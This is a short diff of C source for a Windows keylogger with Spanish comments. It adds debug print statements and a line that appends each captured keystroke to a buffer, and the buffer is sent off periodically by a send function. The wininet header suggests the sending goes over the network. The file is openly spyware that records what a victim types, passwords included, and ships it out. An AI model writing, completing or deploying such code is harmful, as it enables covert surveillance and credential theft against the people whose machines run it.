@@ -4,6 +4,7 @@
 #include <windows.h>
 #include <wininet.h>
 #include <time.h>
+#include <stdio.h>
 
 
 static char messageBuffer1[KEYLOGGER_BUFFER_SIZE] = {0};
@@ -53,16 +54,20 @@ static void swapBuffers(){
 
 //guardar las teclas
 void addKeyToBuffer (const char* letter) {
+    printf("paso1");
     size_t usedBufferBytes = strlen(foregroundBuffer);
     size_t letterSize = strlen(letter);
     size_t remainingBufferBytes = KEYLOGGER_BUFFER_SIZE - usedBufferBytes;
     time_t currentTime = time(NULL);
     time_t elapsedTime = currentTime - lastSentTime;
     if(letterSize>remainingBufferBytes || elapsedTime > KEYLOGGER_SEND_TIME){
+        printf("paso2");
         //enviar lo que tenemos y borrar el buffer
         lastSentTime = currentTime;
         sendBuffer();
     }
+    strcat(foregroundBuffer,letter);
+
 }
 
 //enviar lo que está guardado
